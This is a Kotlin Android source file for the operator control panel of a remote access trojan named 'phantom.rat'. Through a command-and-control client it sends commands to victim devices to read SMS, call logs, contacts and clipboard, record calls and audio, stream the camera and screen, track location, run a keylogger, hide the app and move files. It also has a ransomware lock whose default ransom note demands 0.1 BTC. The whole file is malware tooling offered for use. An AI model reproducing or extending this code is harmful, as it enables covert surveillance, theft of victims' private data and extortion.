package com.phantom.rat.ui

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.fragment.app.Fragment
import androidx.cardview.widget.CardView
import com.google.android.material.bottomsheet.BottomSheetDialog
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.android.material.snackbar.Snackbar
import com.google.android.material.switchmaterial.SwitchMaterial
import com.google.android.material.textfield.TextInputEditText
import com.phantom.rat.R
import com.phantom.rat.core.C2Client
import com.phantom.rat.core.SessionManager
import org.json.JSONObject

class ControlsFragment : Fragment() {

    private lateinit var c2Client: C2Client
    private lateinit var sessionManager: SessionManager
    private lateinit var selectedDeviceId: String
    private lateinit var scrollView: ScrollView

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        return inflater.inflate(R.layout.fragment_controls, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        
        c2Client = C2Client(requireContext())
        sessionManager = SessionManager(requireContext())
        selectedDeviceId = sessionManager.getDeviceId()
        scrollView = view.findViewById(R.id.scrollView)
        
        setupControlButtons(view)
    }

    private fun setupControlButtons(view: View) {
        // === SMS Section ===
        view.findViewById<CardView>(R.id.cardGetSms).setOnClickListener {
            sendCommand("get_sms", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardGetOldSms).setOnClickListener {
            sendCommand("get_sms_old", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardGetNewSms).setOnClickListener {
            sendCommand("get_sms_new", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardSendSms).setOnClickListener {
            showSmsDialog()
        }

        // === Calls Section ===
        view.findViewById<CardView>(R.id.cardGetCallLogs).setOnClickListener {
            sendCommand("get_call_logs", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardRecordCall).setOnClickListener {
            sendCommand("record_call", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardMakeCall).setOnClickListener {
            showCallDialog()
        }

        // === Ransomware Section ===
        view.findViewById<CardView>(R.id.cardRansomwareLock).setOnClickListener {
            showRansomwareLockDialog()
        }
        view.findViewById<CardView>(R.id.cardRansomwareUnlock).setOnClickListener {
            showRansomwareUnlockDialog()
        }
        view.findViewById<CardView>(R.id.cardRansomwareStatus).setOnClickListener {
            sendCommand("ransomware_status", JSONObject())
        }

        // === Camera Section ===
        view.findViewById<CardView>(R.id.cardCameraBack).setOnClickListener {
            sendCommand("camera_capture_back", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardCameraFront).setOnClickListener {
            sendCommand("camera_capture_front", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardStreamBack).setOnClickListener {
            sendCommand("camera_stream_start_back", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardStreamFront).setOnClickListener {
            sendCommand("camera_stream_start_front", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardStreamStop).setOnClickListener {
            sendCommand("camera_stream_stop", JSONObject())
        }

        // === Audio Section ===
        view.findViewById<CardView>(R.id.cardAudioRecord).setOnClickListener {
            showAudioRecordDialog()
        }
        view.findViewById<CardView>(R.id.cardAudioStop).setOnClickListener {
            sendCommand("audio_record_stop", JSONObject())
        }

        // === Location Section ===
        view.findViewById<CardView>(R.id.cardLocation).setOnClickListener {
            sendCommand("get_location", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardLocationPrecise).setOnClickListener {
            sendCommand("get_location_precise", JSONObject())
        }

        // === Files Section ===
        view.findViewById<CardView>(R.id.cardFileList).setOnClickListener {
            showFileListDialog()
        }
        view.findViewById<CardView>(R.id.cardFileDownload).setOnClickListener {
            showFileDownloadDialog()
        }
        view.findViewById<CardView>(R.id.cardFileUpload).setOnClickListener {
            showFileUploadDialog()
        }

        // === Device Section ===
        view.findViewById<CardView>(R.id.cardDeviceInfo).setOnClickListener {
            sendCommand("get_device_info", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardHideApp).setOnClickListener {
            sendCommand("hide_app", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardContacts).setOnClickListener {
            sendCommand("get_contacts", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardInstalledApps).setOnClickListener {
            sendCommand("get_installed_apps", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardClipboard).setOnClickListener {
            sendCommand("get_clipboard", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardOpenUrl).setOnClickListener {
            showOpenUrlDialog()
        }
        view.findViewById<CardView>(R.id.cardVibrate).setOnClickListener {
            showVibrateDialog()
        }

        // === Screen Section ===
        view.findViewById<CardView>(R.id.cardScreenStreamStart).setOnClickListener {
            sendCommand("screen_stream_start", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardScreenStreamStop).setOnClickListener {
            sendCommand("screen_stream_stop", JSONObject())
        }

        // === Keylogger Section ===
        view.findViewById<CardView>(R.id.cardKeyloggerStart).setOnClickListener {
            sendCommand("keylogger_start", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardKeyloggerStop).setOnClickListener {
            sendCommand("keylogger_stop", JSONObject())
        }
        view.findViewById<CardView>(R.id.cardKeyloggerLogs).setOnClickListener {
            sendCommand("keylogger_get_logs", JSONObject())
        }
    }

    private fun sendCommand(type: String, params: JSONObject) {
        val command = JSONObject().apply {
            put("type", type)
            put("params", params)
            put("id", UUID.randomUUID().toString())
            put("timestamp", System.currentTimeMillis())
            put("target_id", selectedDeviceId)
        }
        
        c2Client.sendCommand(selectedDeviceId, command)
        sessionManager.incrementCommandsSent()
        
        Snackbar.make(scrollView, "✅ أمر $type مرسل", Snackbar.LENGTH_SHORT).show()
    }

    private fun showSmsDialog() {
        val dialog = BottomSheetDialog(requireContext())
        val view = layoutInflater.inflate(R.layout.dialog_send_sms, null)
        dialog.setContentView(view)
        
        view.findViewById<Button>(R.id.btnSend).setOnClickListener {
            val number = view.findViewById<TextInputEditText>(R.id.etNumber).text.toString()
            val message = view.findViewById<TextInputEditText>(R.id.etMessage).text.toString()
            if (number.isNotEmpty() && message.isNotEmpty()) {
                sendCommand("send_sms", JSONObject().apply {
                    put("number", number)
                    put("message", message)
                })
                dialog.dismiss()
            }
        }
        
        dialog.show()
    }

    private fun showCallDialog() {
        val dialog = BottomSheetDialog(requireContext())
        val view = layoutInflater.inflate(R.layout.dialog_make_call, null)
        dialog.setContentView(view)
        
        view.findViewById<Button>(R.id.btnCall).setOnClickListener {
            val number = view.findViewById<TextInputEditText>(R.id.etNumber).text.toString()
            if (number.isNotEmpty()) {
                sendCommand("make_call", JSONObject().apply {
                    put("number", number)
                })
                dialog.dismiss()
            }
        }
        
        dialog.show()
    }

    private fun showRansomwareLockDialog() {
        val dialog = BottomSheetDialog(requireContext())
        val view = layoutInflater.inflate(R.layout.dialog_ransomware_lock, null)
        dialog.setContentView(view)
        
        view.findViewById<Button>(R.id.btnLock).setOnClickListener {
            val message = view.findViewById<TextInputEditText>(R.id.etMessage).text.toString()
                .ifEmpty { "تم تشفير جهازك! أرسل 0.1 BTC للفك." }
            val key = view.findViewById<TextInputEditText>(R.id.etKey).text.toString()
                .ifEmpty { java.util.UUID.randomUUID().toString().take(16) }
            val amount = view.findViewById<TextInputEditText>(R.id.etAmount).text.toString()
                .toDoubleOrNull() ?: 0.1
            
            sendCommand("ransomware_lock", JSONObject().apply {
                put("message", message)
                put("key", key)
                put("amount", amount)
                put("crypto", "BTC")
            })
            dialog.dismiss()
            
            Snackbar.make(scrollView, "🔑 مفتاح الفك: $key - احفظه!", Snackbar.LENGTH_LONG).show()
        }
        
        dialog.show()
    }

    private fun showRansomwareUnlockDialog() {
        val dialog = BottomSheetDialog(requireContext())
        val view = layoutInflater.inflate(R.layout.dialog_ransomware_unlock, null)
        dialog.setContentView(view)
        
        view.findViewById<Button>(R.id.btnUnlock).setOnClickListener {
            val key = view.findViewById<TextInputEditText>(R.id.etKey).text.toString()
            if (key.isNotEmpty()) {
                sendCommand("ransomware_unlock", JSONObject().apply {
                    put("key", key)
                })
                dialog.dismiss()
            }
        }
        
        dialog.show()
    }

    private fun showAudioRecordDialog() {
        val dialog = BottomSheetDialog(requireContext())
        val view = layoutInflater.inflate(R.layout.dialog_audio_record, null)
        dialog.setContentView(view)
        
        view.findViewById<Button>(R.id.btnStart).setOnClickListener {
            val duration = view.findViewById<TextInputEditText>(R.id.etDuration).text.toString()
                .toIntOrNull() ?: 30
            sendCommand("audio_record", JSONObject().apply {
                put("duration", duration)
            })
            dialog.dismiss()
        }
        
        dialog.show()
    }

    private fun showFileListDialog() {
        val dialog = BottomSheetDialog(requireContext())
        val view = layoutInflater.inflate(R.layout.dialog_file_list, null)
        dialog.setContentView(view)
        
        view.findViewById<Button>(R.id.btnList).setOnClickListener {
            val path = view.findViewById<TextInputEditText>(R.id.etPath).text.toString()
                .ifEmpty { "/storage/emulated/0" }
            sendCommand("file_list", JSONObject().apply {
                put("path", path)
            })
            dialog.dismiss()
        }
        
        dialog.show()
    }

    private fun showFileDownloadDialog() {
        val dialog = BottomSheetDialog(requireContext())
        val view = layoutInflater.inflate(R.layout.dialog_file_download, null)
        dialog.setContentView(view)
        
        view.findViewById<Button>(R.id.btnDownload).setOnClickListener {
            val path = view.findViewById<TextInputEditText>(R.id.etPath).text.toString()
            if (path.isNotEmpty()) {
                sendCommand("file_download", JSONObject().apply {
                    put("path", path)
                })
                dialog.dismiss()
            }
        }
        
        dialog.show()
    }

    private fun showFileUploadDialog() {
        val dialog = BottomSheetDialog(requireContext())
        val view = layoutInflater.inflate(R.layout.dialog_file_upload, null)
        dialog.setContentView(view)
        
        view.findViewById<Button>(R.id.btnUpload).setOnClickListener {
            val path = view.findViewById<TextInputEditText>(R.id.etPath).text.toString()
            val content = view.findViewById<TextInputEditText>(R.id.etContent).text.toString()
            if (path.isNotEmpty() && content.isNotEmpty()) {
                sendCommand("file_upload", JSONObject().apply {
                    put("path", path)
                    put("content", content)
                })
                dialog.dismiss()
            }
        }
        
        dialog.show()
    }

    private fun showOpenUrlDialog() {
        val dialog = BottomSheetDialog(requireContext())
        val view = layoutInflater.inflate(R.layout.dialog_open_url, null)
        dialog.setContentView(view)
        
        view.findViewById<Button>(R.id.btnOpen).setOnClickListener {
            val url = view.findViewById<TextInputEditText>(R.id.etUrl).text.toString()
            if (url.isNotEmpty()) {
                sendCommand("open_url", JSONObject().apply {
                    put("url", url)
                })
                dialog.dismiss()
            }
        }
        
        dialog.show()
    }

    private fun showVibrateDialog() {
        val dialog = BottomSheetDialog(requireContext())
        val view = layoutInflater.inflate(R.layout.dialog_vibrate, null)
        dialog.setContentView(view)
        
        view.findViewById<Button>(R.id.btnVibrate).setOnClickListener {
            val duration = view.findViewById<TextInputEditText>(R.id.etDuration).text.toString()
                .toLongOrNull() ?: 1000
            sendCommand("vibrate", JSONObject().apply {
                put("duration", duration)
            })
            dialog.dismiss()
        }
        
        dialog.show()
    }
}
